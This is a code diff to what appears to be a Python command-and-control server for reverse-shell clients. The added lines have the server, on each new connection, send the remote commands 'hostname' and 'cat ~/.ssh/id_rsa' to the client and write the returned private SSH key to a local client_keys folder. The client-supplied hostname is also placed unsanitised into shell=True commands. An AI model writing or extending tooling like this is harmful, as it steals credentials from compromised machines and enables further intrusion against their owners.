@@ -1,3 +1,4 @@
+import subprocess
 import os
 import socket, threading, time
 import sys
@@ -29,10 +30,27 @@ def startServer():
     try:
         while SERVER_UP:
             client_sock, addr = server_sock.accept()
-            # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
-            # print()
+            print()
+            print()
+            print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
             CURRENT_CONNECTIONS.append(client_sock)
             CURRENT_ADDRESSES.append(addr)
+            try:
+                client_sock.send("hostname".encode())
+                hostName = client_sock.recv(BUFFER_SIZE).decode().strip()
+                try:
+                    subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
+                except:
+                    subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys",shell=True)
+                    subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
+                client_sock.send("cat ~/.ssh/id_rsa".encode())
+                subprocess.run(f"touch {os.path.expanduser('~')}/client_keys/{hostName}/id_rsa",shell=True)
+                with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","a") as file:
+                    file.write(client_sock.recv(BUFFER_SIZE).decode())
+                    print(f"Private key copied for: {hostName}")
+                print("\n>",end="")
+            except:
+                print("Private key NOT copied!")
             # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
             # print("cmd>")
     except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
